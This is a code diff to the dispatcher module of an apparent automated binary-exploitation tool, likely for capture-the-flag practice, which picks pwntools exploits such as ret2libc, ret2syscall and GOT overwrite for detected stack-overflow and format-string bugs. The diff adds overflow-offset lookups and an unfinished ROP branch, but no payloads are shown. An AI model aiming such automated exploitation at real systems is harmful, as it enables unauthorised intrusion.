@@ -3,13 +3,17 @@ Determines which exploits to call
 """
 
 import re
-from pwn import ELF, process
+from pwn import ELF, process, ROP
 from typing import List, Union
 
 from vulnerabilities import FormatString, StackOverflow, get_format_string_vulns, get_stack_overflow_vulns
 from exploits import ret2win, ret2system, ret2execve, ret2syscall, ret2libc, ropwrite, stack_leak, write_prim, got_overwrite, libc_leak, ret2win_args
+from config import *
+# Unsure if needed still to get offsets in this module
+from vulnerabilities.StackOverflow import get_overflow_size
 
-pointer_re = r"""0x[0-9a-f]*"""
+
+# pointer_re = r"""0x[0-9a-f]*"""
 
 
 def end_prog(flag: str) -> None:
@@ -22,8 +26,14 @@ def dispatch_exploits(file_path: str) -> None:
     Calls exploits based on possible ones
     """
     syms = ELF(file_path).symbols.keys()
+    
+    # Since the offset will return -1 if nothing is found,
+    # these offsets can be used in conditional checks.
+    rsp_offset = get_overflow_size(file_path)
+    rbp_offset = get_overflow_size(file_path, 'rbp')
+    rip_offset = get_overflow_size(file_path, 'rip')
 
-    # Get all vulnerabilites
+    # Get all vulnerabilities
     vulns: List[Union[FormatString, StackOverflow]] = get_format_string_vulns(file_path) + get_stack_overflow_vulns(file_path)
 
     for vuln in vulns:
@@ -88,12 +98,18 @@ def dispatch_exploits(file_path: str) -> None:
                 flag = write_prim(vuln)
                 if flag is not None:
                     end_prog(flag)
+                    
+            elif vuln_printfs in syms and True:
+                flag = None
+                libc = ELF(libc_path)
+                r = ROP([libc])
 
             else:
                 pass  # TODO
                 
         else:
             pass  # TODO
+        
     for vuln1 in vulns:
         for vuln2 in vulns:
             if isinstance(vuln1, FormatString) and isinstance(vuln2, StackOverflow):
